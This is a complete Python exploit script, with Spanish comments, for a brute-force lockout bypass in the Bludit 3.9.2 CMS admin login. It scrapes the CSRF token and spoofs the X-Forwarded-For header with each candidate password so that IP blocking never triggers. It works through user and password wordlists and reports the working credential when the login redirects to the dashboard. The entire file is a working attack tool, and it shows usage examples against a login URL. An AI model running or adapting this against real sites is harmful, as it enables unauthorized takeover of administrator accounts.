#!/usr/bin/env python3

import requests
import sys
import re
import argparse
from pwn import log
from tqdm import tqdm
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# Argumentos esperados
parser = argparse.ArgumentParser(
    description="Bludit-3.9.2-Auth-Bypass",
    formatter_class=argparse.RawTextHelpFormatter,
    epilog='''
Uso del exploit:
./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
./exploit.py -l http://127.0.0.1/admin/login.php -u /Directorio/user.txt -p /Directorio/pass.txt
'''
)

parser.add_argument("-l", "--url", help="Ruta a Bludit (Ejemplo: http://127.0.0.1/admin/login.php)")
parser.add_argument("-u", "--userlist", help="Diccionario de usuarios")
parser.add_argument("-p", "--passlist", help="Diccionario de contraseñas")
args = parser.parse_args()

if len(sys.argv) < 2:
    print("Uso del exploit: ./exploit.py -h [ayuda] -l [url] -u [user.txt] -p [pass.txt]")
    sys.exit(1)

# Variables
LoginPage = args.url
Username_list = args.userlist
Password_list = args.passlist

print(Fore.CYAN + Style.BRIGHT + 'Script de Bypass de Mitigación de Fuerza Bruta de Auth de Bludit por Curiosidades De Hackers\n' + Style.RESET_ALL)

def login(Username, Password, progress_bar):
    session = requests.Session()
    try:
        r = session.get(LoginPage)
    except requests.exceptions.RequestException as e:
        log.failure(f"Fallo al conectar a {LoginPage}: {e}")
        return

    # Obtener el valor del token CSRF
    CSRF_match = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*?)"', r.text)
    if not CSRF_match:
        log.failure("No se pudo obtener el token CSRF")
        return
    CSRF = CSRF_match.group(1)

    # Especificar valores de los encabezados
    headerscontent = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Referer': LoginPage,
        'X-Forwarded-For': Password
    }

    # Datos de la solicitud POST
    postreqcontent = {
        'tokenCSRF': CSRF,
        'username': Username,
        'password': Password
    }

    # Enviar solicitud POST
    try:
        r = session.post(LoginPage, data=postreqcontent, headers=headerscontent, allow_redirects=False)
    except requests.exceptions.RequestException as e:
        log.failure(f"Fallo al enviar solicitud POST a {LoginPage}: {e}")
        return

    # Imprimir Usuario:Contraseña
    log.info(f'Probando -> {Username}:{Password}')

    # Bucle condicional
    if 'Location' in r.headers:
        if "/admin/dashboard" in r.headers['Location']:
            progress_bar.close()
            print()
            log.info(Fore.GREEN + Style.BRIGHT + '¡ÉXITO!' + Style.RESET_ALL)
            log.success(f"Usar credencial -> {Username}:{Password}")
            sys.exit(0)
    elif "has been blocked" in r.text:
        log.failure(f"{Password} - Palabra BLOQUEADA")

# Leer archivos user.txt y pass.txt
try:
    with open(Username_list, encoding='latin-1') as userfile:
        usernames = userfile.readlines()
    with open(Password_list, encoding='latin-1') as passfile:
        passwords = passfile.readlines()
except FileNotFoundError as e:
    log.failure(f"Archivo no encontrado: {e}")
    sys.exit(1)

# Barras de progreso
progress_bar = tqdm(total=len(usernames) * len(passwords), desc=Fore.YELLOW + "Probando credenciales" + Style.RESET_ALL, unit="credencial")

for Username in usernames:
    Username = Username.strip()
    for Password in passwords:
        Password = Password.strip()
        login(Username, Password, progress_bar)
        progress_bar.update(1)

progress_bar.close()
